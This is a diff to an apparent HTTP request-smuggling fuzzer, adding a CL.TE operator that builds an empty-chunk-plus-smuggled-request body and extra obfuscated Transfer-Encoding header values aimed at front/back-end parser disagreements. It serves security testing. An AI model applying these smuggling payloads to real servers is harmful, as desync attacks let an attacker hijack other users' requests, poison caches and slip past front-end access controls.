@@ -246,6 +246,22 @@ def _mut_inject_smuggle(g: Genome, rng: random.Random) -> Genome:
     return g
 
 
+def _mut_clte_null_chunk(g: Genome, rng: random.Random) -> Genome:
+    """CL.TE body: an empty terminating chunk then a smuggled request. A CL-framing
+    hop reads it as opaque body; a TE-framing hop ends the (empty) chunked body at
+    `0\\r\\n\\r\\n` and parses the trailing bytes as a second request. Pairs with an
+    obfuscated Transfer-Encoding the front misses but the backend de-chunks."""
+    payload = b"0\r\n\r\n" + SMUGGLE_PAYLOAD
+    g = list(g)
+    idx = [i for i, o in enumerate(g) if isinstance(o, Data)]
+    if idx:
+        i = rng.choice(idx)
+        g[i] = Data(payload, g[i].end_stream)
+    else:
+        g.append(Data(payload, end_stream=True))
+    return g
+
+
 def _mut_te_chunked(g: Genome, rng: random.Random) -> Genome:
     """Add Transfer-Encoding: chunked (the TE.CL desync primitive)."""
     g = list(g)
@@ -286,13 +302,18 @@ def _mut_case_variant_cl(g: Genome, rng: random.Random) -> Genome:
 
 
 def _mut_te_obfuscate(g: Genome, rng: random.Random) -> Genome:
-    """TE.TE: an obfuscated Transfer-Encoding some parsers honor and others drop
-    (leading-space name, tab, or a conflicting second value)."""
+    """TE.TE: an obfuscated Transfer-Encoding some parsers honor and others drop.
+    The trailing-LWS and transfer-parameter forms defeat a naive suffix/exact
+    chunked check on the front while a backend that trims LWS still de-chunks
+    (sozu 2.x kawa vs Go net/http, issue sozu-proxy/sozu#726)."""
     variant = rng.choice(
         [
             (b" transfer-encoding", b"chunked"),
             (b"transfer-encoding", b"chunked, identity"),
             (b"transfer-encoding", b"\tchunked"),
+            (b"transfer-encoding", b"chunked\t"),
+            (b"transfer-encoding", b"chunked "),
+            (b"transfer-encoding", b"chunked;a=b"),
         ]
     )
     g = list(g)
@@ -739,6 +760,7 @@ OPERATORS: Tuple[Callable[[Genome, random.Random], Genome], ...] = (
     _mut_add_trailer,
     _mut_delay,
     _mut_inject_smuggle,
+    _mut_clte_null_chunk,
     _mut_te_chunked,
     _mut_dup_content_length,
     _mut_case_variant_cl,
